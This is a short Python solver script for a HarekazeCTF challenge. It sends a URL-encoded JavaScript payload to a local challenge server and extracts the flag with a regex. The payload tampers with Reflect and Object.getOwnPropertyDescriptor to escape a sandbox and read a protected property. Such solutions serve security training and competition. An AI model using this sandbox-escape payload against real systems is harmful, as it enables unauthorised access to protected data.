import os
import re
import requests

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '8006')
url = 'http://{}:{}/'.format(host, port)

r = requests.get(url + '?code=Reflect%5Bobj%5B0%5D%3Da%3D%27getOwnPropertyDescriptor%27%5D%3Db%3D>%28%7Bvalue%3Ab%2Cconfigurable%3A1%7D%29%3BObject%5Ba%5D%28obj%2C0%29.value.flag')
flag = re.findall(r'(HarekazeCTF\{.+?\})', r.text)[0]
print(flag)
